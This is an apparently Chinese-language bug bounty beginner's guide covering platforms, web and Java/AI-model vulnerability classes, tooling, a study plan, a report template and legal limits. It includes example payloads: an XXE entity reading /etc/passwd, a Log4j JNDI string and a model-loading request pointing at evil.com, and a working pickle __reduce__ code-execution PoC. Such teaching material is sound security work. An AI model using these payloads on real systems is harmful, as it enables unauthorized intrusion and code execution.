# Bug Bounty 入门实战指南 — 从零到拿到钱

> 本指南面向有 Java 后端 + 逆向工程 + AI/LLM 基础的开发者，帮助你在 4 周内完成从零到提交第一个有效漏洞的全过程。

## 📋 目录

- [一、Bug Bounty 是什么](#一bug-bounty-是什么)
- [二、平台对比与选择](#二平台对比与选择)
- [三、核心知识体系](#三核心知识体系)
- [四、工具链搭建](#四工具链搭建)
- [五、漏洞类型速查表](#五漏洞类型速查表)
- [六、4 周行动计划](#六4-周行动计划)
- [七、漏洞报告模板](#七漏洞报告模板)
- [八、法律法规与红线](#八法律法规与红线)
- [九、进阶路线](#九进阶路线)
- [十、面试题速查](#十面试题速查)

---

## 一、Bug Bounty 是什么

Bug Bounty（漏洞赏金计划）是企业/开源项目邀请安全研究员寻找其产品安全漏洞，并按漏洞等级支付现金奖励的机制。

核心逻辑：
1. 企业在平台发布赏金计划，标明范围和赏金标准
2. 白帽子（你）发现漏洞后提交报告
3. 企业验证确认后支付赏金

你的优势：
- Java 后端经验 → 适合 Spring 生态/中间件漏洞挖掘
- 逆向工程能力 → 适合二进制/协议/序列化漏洞
- AI/LLM 转型中 → Huntr 平台正好是 AI/ML 安全方向
- 代码审计能力 → 补天排行榜很多白帽靠代码审计上分

---

## 二、平台对比与选择

### 国内平台

| 平台 | 网址 | 特点 | 赏金范围 | 推荐度 |
|------|------|------|----------|--------|
| 补天 | butian.net | 奇安信旗下，公益SRC入门友好 | 几百-几万 | ⭐⭐⭐⭐⭐ |
| 漏洞盒子 | vulbox.com | 众测平台，大厂SRC多 | ¥50-¥100000 | ⭐⭐⭐⭐ |
| CNVD | cnvd.org.cn | 国家级漏洞库 | 证书+积分 | ⭐⭐⭐ |

### 国际平台

| 平台 | 网址 | 特点 | 赏金范围 | 推荐度 |
|------|------|------|----------|--------|
| Huntr | huntr.com | AI/ML专用！56个模型格式项目 | $750-$1500/个 | ⭐⭐⭐⭐⭐ |
| HackerOne | hackerone.com | 全球最大BB平台 | $100-$50000+ | ⭐⭐⭐⭐ |
| Bugcrowd | bugcrowd.com | 美国第二大，Web/IoT多 | $500-$100k+ | ⭐⭐⭐⭐ |
| GitHub Security | bughunters.github.com | GitHub自身产品 | $500-$30000 | ⭐⭐⭐ |

### 新手推荐路径

```
补天公益SRC（练手，门槛低）
    ↓ 2-4周后
补天专属SRC / 漏洞盒子众测（赚钱）
    ↓ 1-3月后
Huntr（AI/ML漏洞，$1500/个，你的主战场）
    ↓ 3月+
HackerOne / Bugcrowd（国际大厂）
```

---

## 三、核心知识体系

### 3.1 Web 安全基础（必学）

#### OWASP Top 10 漏洞

1. **注入（SQL/Command/LDAP）**
   - 原理：用户输入被拼接到SQL/命令中执行
   - 检测：单引号、布尔盲注、时间盲注
   - 工具：sqlmap

2. **失效的认证**
   - 弱密码、会话固定、JWT篡改
   - 检测：暴力破解、Session固定测试

3. **敏感数据泄露**
   - 目录遍历、.git泄露、备份文件
   - 工具：gobuster、ffuf

4. **XXE（XML外部实体注入）**
   - 原理：XML解析器加载外部实体
   - 检测：在XML输入中注入 `<!ENTITY xxe SYSTEM "file:///etc/passwd">`

5. **失效的访问控制**
   - 越权访问（水平/垂直）
   - 检测：修改用户ID/角色参数

6. **安全配置错误**
   - 默认密码、调试模式开启、不安全headers
   - 检测：nmap服务识别、目录扫描

7. **XSS（跨站脚本）**
   - 反射型、存储型、DOM型
   - 检测：`<script>alert(1)</script>` 等payload

8. **不安全的反序列化**
   - Java: Fastjson/Shiro/Log4j
   - 检测：看是否有序列化数据传输，尝试构造恶意对象

9. **使用含已知漏洞的组件**
   - 检测：扫描版本号，对比CVE库
   - 工具：nuclei、nmap

10. **SSRF（服务端请求伪造）**
    - 原理：服务端发起请求，可访问内网
    - 检测：URL参数中替换为内网地址

#### Java 特有漏洞（你的主战场）

```
Fastjson 反序列化  → JNDI注入 → RCE
Shiro 反序列化     → RememberMe cookie → RCE
Log4j2 JNDI注入   → ${jndi:ldap://evil.com/exp}
Spring Boot Actuator 未授权 → 信息泄露/RCE
Spring Cloud Gateway SpEL注入 → RCE
XXE in Java       → DocumentBuilder/SAXParser默认开启外部实体
```

### 3.2 代码审计（核心技能）

#### 审计流程

```
1. 确定目标项目 → clone源码
2. 理解架构 → 看README、pom.xml/gradle依赖
3. 搜索危险函数 → semgrep/codeql自动化扫描
4. 人工追踪数据流 → 从用户输入到危险函数
5. 构造PoC → 验证漏洞可利用
6. 编写报告 → 提交平台
```

#### 危险函数速查（Java）

```java
// 命令执行
Runtime.getRuntime().exec(userInput);
ProcessBuilder(userInput);

// SQL注入
String sql = "SELECT * FROM users WHERE name='" + userInput + "'";
Statement.execute(sql);  // 危险！应用PreparedStatement

// 反序列化
ObjectInputStream.readObject();
XMLDecoder.readObject();
fastjson.JSON.parseObject(userInput);

// XXE
DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(input);  // 默认不安全
SAXParserFactory.newInstance().newSAXParser().parse(input);

// SSRF
URL(userInput).openConnection();
HttpClient.execute(new HttpGet(userInput));
RestTemplate.getForObject(userInput, String.class);

// 文件操作（路径穿越）
new File(userInput);
FileInputStream(userInput);
Files.readAllBytes(Paths.get(userInput));

// 表达式注入
SpelExpressionParser().parseExpression(userInput).getValue();
MVEL.eval(userInput);
```

#### 危险函数速查（Python，AI项目常见）

```python
# 命令执行
os.system(user_input)
subprocess.call(user_input, shell=True)
eval(user_input)  # 代码注入
exec(user_input)

# 反序列化
pickle.loads(user_data)  # RCE！
yaml.load(user_data)  # 默认不安全，需 yaml.safe_load
torch.load(model_file)  # PyTorch模型加载，可RCE

# 路径穿越
open(user_input)
os.path.join(base, user_input)  # 如果user_input含../

# SSRF
requests.get(user_url)
urllib.request.urlopen(user_url)
```

### 3.3 AI/ML 安全（Huntr平台方向）

#### 模型文件反序列化漏洞

这是 Huntr 平台最常见的漏洞类型：

```
模型格式          → 反序列化方式         → 风险
─────────────────────────────────────────────────────
Pickle (.pkl)    → pickle.loads()      → 任意代码执行
PyTorch (.pth)    → torch.load()        → 底层用pickle
TF SavedModel     → tf.saved_model.load → 较安全
GGUF              → 自定义解析器         → 内存安全
ONNX              → protobuf解析        → 较安全
Keras (.h5)       → h5py + pickle       → 部分风险
MLFlow            → pickle/joblib       → RCE
```

#### 典型攻击链

```
恶意模型文件 → 受害者加载 → pickle反序列化 → __reduce__方法 → 执行任意代码 → RCE
```

PoC示例（教育用途）：

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))

# 序列化为模型文件
with open("evil_model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)

# 受害者加载时触发
# pickle.load(open("evil_model.pkl", "rb"))  → 执行 os.system("id > /tmp/pwned")
```

---

## 四、工具链搭建

### 4.1 核心工具安装（macOS）

```bash
# 基础扫描工具
brew install nmap          # 网络扫描/服务识别
brew install nikto         # Web服务器漏洞扫描
brew install sqlmap        # SQL注入自动化
brew install gobuster      # 目录/子域名爆破
brew install ffuf          # 模糊测试/目录爆破
brew install amass         # 子域名枚举
brew install subfinder     # 子域名发现
brew install httpx         # HTTP探测

# 代码审计工具
brew install semgrep       # 多语言静态分析
# CodeQL需单独安装：
# https://github.com/github/codeql-cli-binaries/releases

# 漏洞扫描框架
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Burp Suite（Web渗透必备）
# 下载社区版: https://portswigger.net/burp/communitydownload
```

### 4.2 Burp Suite 配置指南

Burp Suite 是 Web 安全测试的核心工具，社区版免费：

1. 下载安装后，配置浏览器代理 127.0.0.1:8080
2. 安装证书：浏览器访问 http://burp/cert 下载CA证书
3. 导入证书到浏览器信任存储
4. 常用模块：
   - Proxy：拦截/修改HTTP请求
   - Repeater：重放请求，手工测试
   - Intruder：自动化模糊测试
   - Scanner（Pro版）：自动漏洞扫描

### 4.3 代码审计工具配置

#### Semgrep

```bash
# 安装后直接使用，扫描Java项目
semgrep --config=p/java semgrep --config=p/security-audit

# 自定义规则扫描危险函数
semgrep -e 'Runtime.getRuntime().exec($X)' --lang=java ./src/

# 扫描Python项目（AI项目）
semgrep --config=p/python semgrep --config=p/security-audit
```

#### CodeQL

```bash
# 安装CodeQL CLI
# 下载: https://github.com/github/codeql-cli-binaries/releases

# 创建数据库（Java项目）
codeql database create my-db --language=java --command="mvn clean install"

# 创建数据库（Python项目）
codeql database create my-db --language=python --command="pip install -r requirements.txt"

# 运行查询
codeql database analyze my-db codeql/java-queries --format=sarif --output=results.sarif
```

### 4.4 Docker 靶场环境

```bash
# DVWA（Web漏洞练习）
docker run -d -p 8080:80 vulnerables/web-dvwa

# WebGoat（Java Web安全练习）
docker run -d -p 8081:8080 -p 9090:9090 webgoat/goatandwolf

# Juice Shop（现代Web应用漏洞练习）
docker run -d -p 3000:3000 bkimminich/juice-shop

# Vulnerable Java App
docker run -d -p 8082:8080 appsecco/vulnerable-java-app
```

---

## 五、漏洞类型速查表

### 按严重程度分级

| 等级 | 漏洞类型 | 典型赏金 | 描述 |
|------|----------|----------|------|
| 严重 | RCE（远程代码执行） | ¥5000-$50000 | 攻击者可在服务器执行任意命令 |
| 严重 | SQL注入（可读写数据） | ¥3000-$20000 | 可获取/修改数据库内容 |
| 高危 | 反序列化RCE | ¥2000-$15000 | Java Fastjson/Shiro等 |
| 高危 | SSRF（内网访问） | ¥1000-$10000 | 可访问内网服务/云元数据 |
| 高危 | 任意文件上传/读取 | ¥1000-$5000 | 可上传webshell或读取敏感文件 |
| 中危 | XSS（存储型） | ¥500-$2000 | 恶意脚本持久化存储 |
| 中危 | 越权访问 | ¥500-$2000 | 访问无权限的数据/功能 |
| 中危 | 信息泄露 | ¥200-$1000 | 源码/密钥/用户数据泄露 |
| 低危 | CSRF | ¥100-$500 | 伪造用户请求 |
| 低危 | 安全配置错误 | ¥100-$500 | 调试模式/默认密码 |

### Java 漏洞速查（你的优势方向）

```
漏洞类型              → 检测特征                        → 利用工具/方式
──────────────────────────────────────────────────────────────────────
Fastjson ≤1.2.80      → 看到fastjson依赖+JSON接口       → JNDI注入payload
Shiro ≤1.2.4          → rememberMe cookie               → Shiro爆破工具
Shiro ≤1.4.1          → AES-CBC模式                     → Padding Oracle
Log4j2 ≤2.14.1        → 任何被日志记录的输入             → ${jndi:ldap://x}
Spring Boot Actuator  → /actuator路径可访问             → /heapdump等
Spring Cloud Gateway  → CVE-2022-22947                  → SpEL注入
Struts2               → .action/.do后缀                 → S2-001~S2-066
```

---

## 六、4 周行动计划

### 第1周：环境搭建 + 基础学习

**目标：** 工具就绪，理解Web漏洞基础

| 天 | 任务 | 产出 |
|----|------|------|
| Day1 | 安装工具链（nmap/sqlmap/nuclei/semgrep/Burp） | 工具全部可用 |
| Day2 | 注册补天+漏洞盒子+Huntr+HackerOne账号 | 账号就绪 |
| Day3 | Docker启动DVWA+Juice Shop靶场 | 本地靶场可访问 |
| Day4 | DVWA练习SQL注入（低/中/高难度） | 手工注入成功 |
| Day5 | DVWA练习XSS+CSRF+文件上传 | 理解payload构造 |
| Day6 | Burp Suite基础操作（代理/Repeater/Intruder） | 能拦截修改请求 |
| Day7 | 读OWASP Top 10文档，整理笔记 | 知识体系建立 |

### 第2周：代码审计 + Java漏洞

**目标：** 掌握Java代码审计，能发现简单漏洞

| 天 | 任务 | 产出 |
|----|------|------|
| Day8 | semgrep+CodeQL扫描一个Java开源项目 | 扫描报告 |
| Day9 | 学习Fastjson反序列化原理+复现 | 本地复现成功 |
| Day10 | 学习Shiro反序列化+复现 | 本地复现成功 |
| Day11 | 学习Log4j2 JNDI注入+复现 | 本地复现成功 |
| Day12 | 学习Spring Boot Actuator未授权 | 能检测+利用 |
| Day13 | 审计一个GitHub上的Java小项目 | 发现1个可疑点 |
| Day14 | 整理Java漏洞笔记，写复现博客 | 笔记完成 |

### 第3周：实战挖洞 — 补天公益SRC

**目标：** 提交第一个有效漏洞

| 天 | 任务 | 产出 |
|----|------|------|
| Day15 | 浏览补天公益SRC项目列表，选3个目标 | 目标列表 |
| Day16 | 对目标做信息收集（子域名/端口/目录） | 信息收集报告 |
| Day17 | nuclei自动化扫描目标 | 扫描结果 |
| Day18 | 手工测试Web漏洞（注入/XSS/越权） | 测试记录 |
| Day19 | 代码审计目标的GitHub仓库 | 审计结果 |
| Day20 | 发现漏洞后写报告+提交 | 提交第一个漏洞 |
| Day21 | 复盘+学习其他白帽的公开报告 | 经验总结 |

### 第4周：Huntr AI/ML漏洞 — 你的主战场

**目标：** 在Huntr上选定一个项目开始审计

| 天 | 任务 | 产出 |
|----|------|------|
| Day22 | 浏览huntr.com/bounties，选一个AI/ML项目 | 选定目标 |
| Day23 | clone源码，理解架构和数据流 | 项目分析 |
| Day24 | semgrep扫描危险函数（pickle/eval/os.system） | 扫描结果 |
| Day25 | 追踪用户输入到危险函数的数据流 | 漏洞候选 |
| Day26 | 构造PoC，验证漏洞可利用 | PoC代码 |
| Day27 | 写漏洞报告，提交Huntr | 提交漏洞 |
| Day28 | 整理全部学习笔记，规划下个月 | 月度总结 |

---

## 七、漏洞报告模板

好的报告 = 更快确认 + 更高赏金

```markdown
## 漏洞标题
[平台名] [漏洞类型] in [功能/文件路径]

## 漏洞等级
严重/高/中/低

## 漏洞描述
简述漏洞：什么功能、什么输入、导致什么后果。

## 影响范围
- 受影响版本：x.x.x ~ x.x.x
- 影响功能：xxx接口/模块
- 潜在影响：RCE/数据泄露/权限提升

## 复现步骤
1. 访问 http://target.com/api/xxx
2. 在参数 xxx 中输入 payload: `xxx`
3. 观察响应/服务器行为

## PoC（概念验证）

### 请求
```http
POST /api/v1/model/load HTTP/1.1
Host: target.com
Content-Type: application/json

{"model_url": "http://evil.com/payload.pkl"}
```

### 响应
```http
HTTP/1.1 200 OK
{"status": "loaded", "output": "uid=0(root) gid=0(root)"}
```

## 修复建议
1. 输入验证：对 xxx 参数做白名单校验
2. 使用安全替代：用 safe_load 替代 load
3. 最小权限：服务以非root运行

## 参考资料
- CVE-2024-XXXX
- https://owasp.org/...
```

---

## 八、法律法规与红线

### 绝对不能做的

1. 不要在没有授权的目标上测试（即使你只是"看看"）
2. 不要删除/修改目标数据（只读测试）
3. 不要用漏洞进行敲诈/勒索
4. 不要在漏洞修复前公开漏洞细节
5. 不要测试不在赏金范围内的资产
6. 不要使用自动化的DDoS/暴力破解压垮目标

### 中国法律参考

- 《网络安全法》第二十七条：任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动
- 《刑法》第二百八十五条：非法侵入计算机信息系统罪/非法获取计算机信息系统数据罪
- 合规要点：只测赏金计划明确授权的目标，不破坏数据，不传播攻击工具

### 安全测试合规清单

```
☑ 目标在赏金计划范围内
☑ 使用测试账号，不影响真实用户
☑ 只验证漏洞存在，不深入利用
☑ 不下载/泄露真实用户数据
☑ 报告提交后等待修复再公开
☑ 遵守平台规则（如不并行提交多个平台）
```

---

## 九、进阶路线

### 3-6个月目标

```
补天公益SRC → 积累10+有效漏洞，达到"黄金"段位
Huntr → 提交2-3个AI/ML漏洞，每个$750-$1500
漏洞盒子 → 参加1-2次众测项目
```

### 6-12个月目标

```
HackerOne → 注册并提交第一个有效漏洞
建立个人品牌 → 写漏洞分析博客（在不泄露细节的前提下）
加入安全团队 → 补天/漏洞盒子排名靠前的团队
考虑OSCP认证 → 提升简历含金量
```

### 长期方向选择

| 方向 | 适合你的技能 | 收入预期 |
|------|-------------|----------|
| Web漏洞挖掘 | Java后端经验 | ¥5000-30000/月 |
| 代码审计 | Java+Python能力 | ¥10000-50000/月 |
| AI/ML安全 | LLM/GGUF/vLLM经验 | $2000-10000/月 |
| 二进制/RE | 逆向工程能力 | 高但门槛高 |
| 安全工具开发 | 开发能力 | 被动收入 |

---

## 十、面试题速查

### Q1: 什么是SQL注入？如何防御？

思路：
- 原理：用户输入被拼接到SQL语句中，导致执行非预期SQL
- 类型：联合查询型、布尔盲注、时间盲注、堆叠注入
- 防御：参数化查询（PreparedStatement）、ORM框架、输入验证、最小权限

### Q2: Java反序列化漏洞原理？Fastjson为什么有漏洞？

思路：
- 反序列化时自动调用对象的某些方法（如readObject、setter等）
- Fastjson通过@type指定反序列化类，攻击者可指定恶意类
- 利用链：Fastjson → JdbcRowSetImpl → JNDI → LDAP/RMI → 远程类加载 → RCE
- 防御：升级到最新版、关闭autoType、白名单

### Q3: SSRF如何利用？云环境中有什么特殊风险？

思路：
- SSRF：服务端发起请求，攻击者控制URL
- 利用：访问内网服务、读取云元数据（169.254.169.254）
- 云风险：AWS/阿里云元数据可获取临时凭证 → 接管云服务
- 防御：URL白名单、禁止内网IP、禁用不支持的协议

### Q4: Pickle反序列化为什么危险？AI模型加载有什么安全风险？

思路：
- pickle.loads()会执行对象的__reduce__方法
- 攻击者可构造恶意模型文件，加载时执行任意代码
- torch.load()底层用pickle，同样有风险
- 防御：只加载可信来源的模型、用safetensors替代pickle、用torch.load(weights_only=True)

### Q5: 如何在代码审计中快速定位漏洞？

思路：
1. 看依赖版本（pom.xml/requirements.txt）→ 对比CVE
2. semgrep/codeql自动化扫描危险函数
3. 搜索用户输入入口（@RequestMapping/Flask路由）
4. 追踪数据流：输入 → 处理 → 危险函数
5. 重点看：反序列化、命令执行、SQL拼接、文件操作、URL请求

### Q6: 提交Bug Bounty报告有什么技巧？

思路：
- 标题清晰：[漏洞类型] in [位置]
- 复现步骤要详细，让审核者能一步到位复现
- 提供PoC（请求+响应截图）
- 说明影响范围和严重程度
- 给出修复建议
- 不要假设审核者了解你的思路

---

## 参考资源

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- 补天帮助中心: https://www.butian.net/help
- Huntr文档: https://huntr.com/bounties
- HackerOne Hacktivity: https://hackerone.com/hacktivity
- PortSwigger Web Security: https://portswigger.net/web-security
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- Java安全知识: https://github.com/Y4tacker/JavaSec
- AI安全: https://github.com/greynagle/awesome-ml-security
